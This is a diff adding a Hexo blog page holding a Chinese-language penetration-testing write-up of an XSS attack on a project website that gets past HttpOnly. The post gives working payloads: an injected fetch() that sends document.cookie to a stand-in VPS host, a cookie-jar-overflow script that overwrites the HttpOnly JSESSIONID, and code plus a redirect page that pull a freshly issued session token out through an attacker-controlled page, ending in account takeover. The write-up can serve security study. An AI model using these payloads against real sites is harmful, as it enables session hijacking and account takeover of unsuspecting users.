@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="记一次绕过 HttpOnly 的 XSS 攻击 前言 初发现 fetch() 利用 CORS 利用 Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。 后记    记一次绕过 HttpOnly 的 XSS 攻击前言项目中一个网站，发现该网站存在 XSS 攻击点，有基本的安全防御。本来只想弹个框就收档，无奈 alert() 被 WAF，然后莫名奇妙折腾下去，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次绕过 HttpOnly 的 XSS 攻击">
+<meta property="og:url" content="http://example.com/2023/02/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87-HttpOnly-%E7%9A%84-XSS-%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="sing&#39;s Blog">
+<meta property="og:description" content="记一次绕过 HttpOnly 的 XSS 攻击 前言 初发现 fetch() 利用 CORS 利用 Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。 后记    记一次绕过 HttpOnly 的 XSS 攻击前言项目中一个网站，发现该网站存在 XSS 攻击点，有基本的安全防御。本来只想弹个框就收档，无奈 alert() 被 WAF，然后莫名奇妙折腾下去，">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/092eeed1e9fa915c8985c2a087b3dc70cb2ae208237b57553d10d673ab0fc2fa.png">
+<meta property="og:image" content="http://example.com/img/5df36167c363ec25aa15d73dba71def23b69d5a4ec2bc1a802cfcf38c4f40947.png">
+<meta property="og:image" content="http://example.com/img/cd39cd156fbd98fd9e82d558c8e6c777ff10e811cacb798e7fd78e09f055a0d6.png">
+<meta property="article:published_time" content="2023-02-06T12:38:59.000Z">
+<meta property="article:modified_time" content="2023-02-06T12:40:59.762Z">
+<meta property="article:author" content="sing">
+<meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="HttpOnly">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/092eeed1e9fa915c8985c2a087b3dc70cb2ae208237b57553d10d673ab0fc2fa.png">
+
+<link rel="canonical" href="http://example.com/2023/02/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87-HttpOnly-%E7%9A%84-XSS-%E6%94%BB%E5%87%BB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>记一次绕过 HttpOnly 的 XSS 攻击 | sing's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">sing's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-首页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87-HttpOnly-%E7%9A%84-XSS-%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="sing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sing's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          记一次绕过 HttpOnly 的 XSS 攻击
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-02-06 20:38:59 / Modified: 20:40:59" itemprop="dateCreated datePublished" datetime="2023-02-06T20:38:59+08:00">2023-02-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <ul>
+<li><a href="#%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87-httponly-%E7%9A%84-xss-%E6%94%BB%E5%87%BB">记一次绕过 HttpOnly 的 XSS 攻击</a><ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E5%88%9D%E5%8F%91%E7%8E%B0">初发现</a></li>
+<li><a href="#fetch-%E5%88%A9%E7%94%A8"><code>fetch()</code> 利用</a></li>
+<li><a href="#cors-%E5%88%A9%E7%94%A8">CORS 利用</a></li>
+<li><a href="#cookie-jar-overflow--fetch--%E7%BD%91%E7%AB%99%E7%89%B9%E6%AE%8A%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%E8%8E%B7%E5%8F%96%E6%9C%89%E6%95%88%E8%AE%A4%E8%AF%81">Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。</a></li>
+<li><a href="#%E5%90%8E%E8%AE%B0">后记</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="记一次绕过-HttpOnly-的-XSS-攻击"><a href="#记一次绕过-HttpOnly-的-XSS-攻击" class="headerlink" title="记一次绕过 HttpOnly 的 XSS 攻击"></a>记一次绕过 HttpOnly 的 XSS 攻击</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>项目中一个网站，发现该网站存在 XSS 攻击点，有基本的安全防御。本来只想弹个框就收档，无奈 <code>alert()</code> 被 WAF，然后莫名奇妙折腾下去，遂有本文。</p>
+<h2 id="初发现"><a href="#初发现" class="headerlink" title="初发现"></a>初发现</h2><p>站点网页 <a href="http://example.com/xxx/getCheckHouseList?estateNum=1111">http://example.com/xxx/getCheckHouseList?estateNum=1111</a> ，访问后，<code>estateNum=1111</code> 将会反映在 JavaScript 标签中。</p>
+<p><img src="/img/092eeed1e9fa915c8985c2a087b3dc70cb2ae208237b57553d10d673ab0fc2fa.png" alt="图 1"> </p>
+<p>经过手工测试后，发现 <code>estateNum=1111</code> 存在 XSS 利用点，  尝试 <code>?estateNum=1111&#39;;alert()</code> ,发现服务器对请求不做应答。确认存在防御措施。</p>
+<h2 id="fetch-利用"><a href="#fetch-利用" class="headerlink" title="fetch() 利用"></a><code>fetch()</code> 利用</h2><p>插入 <code>fetch()</code> 函数测试，发现居然通过了安全检测。修改插入的 JavaScript 代码，尝试向 VPS 发送 <code>Cookie</code>  。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?estateNum=1111&#x27;;fetch(&#x27;http://vpsip/&#x27;+document.cookie,&#123;method: &#x27;GET&#x27;&#125;);//</span><br></pre></td></tr></table></figure>
+
+<p>查看网络发现，发送的 Cookie 字段不完整，真正有用的 JSESSIONID 缺失了。原来 JSESSIONID 设置了 HttpOnly 属性。喵喵喵？？？？</p>
+<p><img src="/img/5df36167c363ec25aa15d73dba71def23b69d5a4ec2bc1a802cfcf38c4f40947.png" alt="图 2"><br><img src="/img/cd39cd156fbd98fd9e82d558c8e6c777ff10e811cacb798e7fd78e09f055a0d6.png" alt="图 4">  </p>
+<h2 id="CORS-利用"><a href="#CORS-利用" class="headerlink" title="CORS 利用"></a>CORS 利用</h2><p>既然无法直接发送Cookie，那就换个方式吧。修改 JavaScript 代码，通过 fetch() 进行携带 Cookie 的跨域访问以获取 Cookie。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://vpsip/&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;cors&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>理所当然，失败了。原因是误解了关于 <code>credentials: &#39;include&#39;</code> 的描述，<code>credentials: &#39;include&#39;</code> 指示浏览器只能将本域 cookie 发送到本域以及子域，但无论如何本域 Cookie 均不能发送到他域。以下是查找资源及测试后关于 <code>credentials: &#39;include&#39;</code> 的理解。</p>
+<p><strong>域与子域之间：</strong></p>
+<p><strong>在域的响应头中设置 <code>credentials: include</code></strong></p>
+<ul>
+<li>到域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到域服务器</li>
+<li>到子域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到子域服务器</li>
+</ul>
+<p><strong>在子域的响应头中设置 <code>credentials: include</code></strong></p>
+<ul>
+<li>到子域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到子域服务器</li>
+<li>到域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到域服务器</li>
+</ul>
+<p><strong>在域的响应头中设置<code>credentials: same-origin</code></strong></p>
+<ul>
+<li>到域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到域服务器</li>
+<li>到子域服务器：没有 cookie 发送到服务器</li>
+</ul>
+<p><strong>在子域的响应头中设置<code>credentials: same-origin</code></strong></p>
+<ul>
+<li>到子域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到子域服务器</li>
+<li>到域服务器：没有cookies被发送到服务器</li>
+</ul>
+<p><strong>域与域之间（注意：<code>SameSite：none</code> 需要 https，否则设置无效）：</strong></p>
+<p><strong>在 A 域的响应头中设置 <code>credentials: include</code></strong></p>
+<ul>
+<li>到 A 域服务器：<code>SameSite</code> 属性为 <code>strict</code> 、 <code>lax</code> 和 <code>none</code> 的 cookie 会被发送到 A 域服务器</li>
+<li>到 B 域服务器: <code>SameSite</code> 属性为 <code>none</code> 的外部 cookie 会被发送到 B 域服务器，即由 B 域设置 Cookie 会被发送，A 域 Cookie 不会被发送。</li>
+</ul>
+<p><strong>在 B 域的响应头中设置 <code>credentials: include</code></strong></p>
+<ul>
+<li>到 B 域服务器： <code>SameSite</code> 属性为 <code>strict</code> 、 <code>lax</code> 和 <code>none</code> 的 cookie 会被发送到 B 域服务器</li>
+<li>到 A 域服务器：<code>SameSite</code> 属性为 <code>none</code> 的外部 cookie 会被发送到 A 服务器，即由 A 域设置 Cookie 会被发送域，B 域 Cookie 不会被发送。</li>
+</ul>
+<p><strong>在 A 域的响应头中设置 <code>credentials: same-origin</code></strong></p>
+<ul>
+<li>到 A 域服务器：<code>SameSite</code> 属性为 <code>strict</code> 、 <code>lax</code> 和 <code>none</code> 的 cookie 会被发送到 A 域服务器</li>
+<li>到 B 域服务器: 没有 cookie 发送到服务器</li>
+</ul>
+<p><strong>在 B 域的响应头中设置 <code>credentials: same-origin</code></strong></p>
+<ul>
+<li>到 B 域服务器： <code>SameSite</code> 属性为 <code>strict</code> 、 <code>lax</code> 和 <code>none</code> 的 cookie 会被发送到 B 域服务器</li>
+<li>到 A 域服务器：没有 cookie 发送到服务器</li>
+</ul>
+<blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://zellwk.com/blog/handling-cookies-with-fetchs-credentials/">https://zellwk.com/blog/handling-cookies-with-fetchs-credentials/</a></p>
+</blockquote>
+<h2 id="Cookie-Jar-Overflow-fetch-网站特殊认证方式获取有效认证。"><a href="#Cookie-Jar-Overflow-fetch-网站特殊认证方式获取有效认证。" class="headerlink" title="Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。"></a>Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。</h2><p>目标网站关于认证的信息：</p>
+<ol>
+<li>第一次访问 A 站点，服务器会进行 <code>Set-Cookie</code> 操作：<code>Set-Cookie: JSESSIONID=AAAAAA; HttpOnly</code>。</li>
+<li>A 站点携带 <code>Cookie: JSESSIONID=AAAAAA</code> 访问要求凭证的接口时， 由于未进行统一认证，服务器返回 302 响应包，浏览器被重定向到统一认证地址，其中重定向地址的 <code>redirect_uri</code> 参数包含 A 站点的地址以及 base64 加密后 <code>AAAAAA</code>。</li>
+<li>打开统一认证地址完成认证之后，认证服务器将返回 302 响应包，重定向地址正是 <code>步骤 2</code> 中 <code>redirect_uri</code> 参数的值</li>
+<li>至此，<code>AAAAAA</code> 将变成有效凭证。</li>
+</ol>
+<p>对于重新认证的方式却有点不同：</p>
+<ol>
+<li>认证后，修改 A 站点 Cookie 为 <code>JSESSIONID=BBBBBB</code> 。</li>
+<li>A 站点携带 <code>Cookie: JSESSIONID=BBBBBB</code> 访问要求凭证的接口时， 由于未进行统一认证，服务器返回 302 响应包，且进行 <code>Set-Cookie</code> 操作：<code>Set-Cookie: JSESSIONID=CCCCCC; HttpOnly</code>。浏览器被重定向到统一认证地址，其中重定向地址的 <code>redirect_uri</code> 参数包含 A 站点地址以及 base64 加密后 <code>CCCCCC</code>。</li>
+<li>浏览器重定向到统一认证地址，由于之前已经完成认证，在有效时间内统一认证地址的 Cookie 将一直可用。所以，本次无需重新手动认证，统一认证站点将会直接返回 302 响应包，重定向地址正是 <code>步骤 2</code> 中 <code>redirect_uri</code> 参数的值</li>
+<li>至此，<code>CCCCC</code> 将变成有效凭证。</li>
+</ol>
+<p>对于重新认证，又有一个特别情况：</p>
+<ol>
+<li>将 A 站点 Cookie 修改为 <code>JSESSIONID=BBBBBB</code>后，在携带 <code>Cookie: JSESSIONID=BBBBBB</code> 访问要求凭证的接口时，在请求包添加请求头 <code>X-Requested-With: XMLHttpRequest</code>，服务器会返回 200 响应码，包含 <code>Set-Cookie: JSESSIONID=CCCCCC</code> 以及响应主体 json 数据，该 json 数据包含统一认证地址，地址中的 <code>redirect_uri</code> 参数包含 A 站点地址以及 base64 加密后 <code>CCCCCC</code>。</li>
+<li>再次访问要求凭证的接口，A 站点将返回与 <code>步骤 1 </code> 所提及的，一模一样的统一认证地址。</li>
+<li>统一认证地址返回 302 ，再次进行重定向。</li>
+<li>至此，<code>CCCCC</code> 将变成有效凭证</li>
+</ol>
+<p>基于上面的情况，构建如下攻击方式：</p>
+<ol>
+<li><p>通过 Cookie Jar Overflow 攻击覆盖原来有效的 Cookie，即 <code>Cookie: JSESSIONID=AAAAAA</code> 覆盖为 <code>Cookie: JSESSIONID=BBBBBB</code>。</p>
+  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Cookie Jar Overflow</span></span><br><span class="line"><span class="comment">//生成多个 cookie</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">700</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">`cookie<span class="subst">$&#123;i&#125;</span>=<span class="subst">$&#123;i&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除所有 cookie</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">700</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">`cookie<span class="subst">$&#123;i&#125;</span>=<span class="subst">$&#123;i&#125;</span>;expires=Thu, 01 Jan 1970 00:00:01 GMT`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//覆盖 HttpOnly cookie</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;JSESSIONID=BBBBBB;path=/&quot;</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过 fetch() 访问要求访问凭证接口，需添加 <code>X-Requested-With: XMLHttpRequest</code> 请求头。正如 <em><strong>对于重新认证，又有一个特别情况</strong></em> 所提及，服务器返回 json 数据，fetch 也提供了读取 json 数据的处理函数，所以我们可以将 json 数据读取出来，并将关键部分发送到 vps ，且 vps 返回重定向响应要求受害者浏览器访问 A 站点要求凭证的接口。<em><strong>重新认证</strong></em> 流程走一遍之后，发送到 vps 的凭证将变得可用。</p>
+</li>
+</ol>
+<blockquote>
+<p>为什么要添加 <code>X-Requested-With: XMLHttpRequest</code>，而不直接访问？因为到现在为止还未发现 fetch() 中读取 302 响应包的请求头方式。  </p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://target.com/requiredAuthenticationAPI&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span> <span class="comment">//针对此应用程序，不添加该请求头服务器无法返回包含新可用 cookie 的 json 数据。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">    response.<span class="title function_">json</span>().<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">        location = <span class="string">&#x27;http://127.0.0.1/location.html?x=&#x27;</span> + data.<span class="property">data</span>; <span class="comment">//</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error);</span><br><span class="line">&#125;); <span class="comment">//</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>location.html</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;http://target.com/requiredAuthenticationAPI&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>成功获取有效凭证并控制账号。</li>
+</ol>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>关于 “<em><strong>Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。</strong></em>“ 的利用，后面发现了一些情况。  JavaScript 代码执行到 fetch() 代码处，浏览器将根据代码生成请求包，但请求不立刻发送。待后续 JavaScript 代码执行完后，再进行发送。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag"># WEB安全</a>
+              <a href="/tags/XSS/" rel="tag"># XSS</a>
+              <a href="/tags/HttpOnly/" rel="tag"># HttpOnly</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/05/H2C%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/" rel="prev" title="H2C请求走私攻击">
+      <i class="fa fa-chevron-left"></i> H2C请求走私攻击
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87-HttpOnly-%E7%9A%84-XSS-%E6%94%BB%E5%87%BB"><span class="nav-number">1.</span> <span class="nav-text">记一次绕过 HttpOnly 的 XSS 攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E5%8F%91%E7%8E%B0"><span class="nav-number">1.2.</span> <span class="nav-text">初发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fetch-%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">fetch() 利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CORS-%E5%88%A9%E7%94%A8"><span class="nav-number">1.4.</span> <span class="nav-text">CORS 利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cookie-Jar-Overflow-fetch-%E7%BD%91%E7%AB%99%E7%89%B9%E6%AE%8A%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%E8%8E%B7%E5%8F%96%E6%9C%89%E6%95%88%E8%AE%A4%E8%AF%81%E3%80%82"><span class="nav-number">1.5.</span> <span class="nav-text">Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">1.6.</span> <span class="nav-text">后记</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">sing</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">37</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sing</span>
+</div>
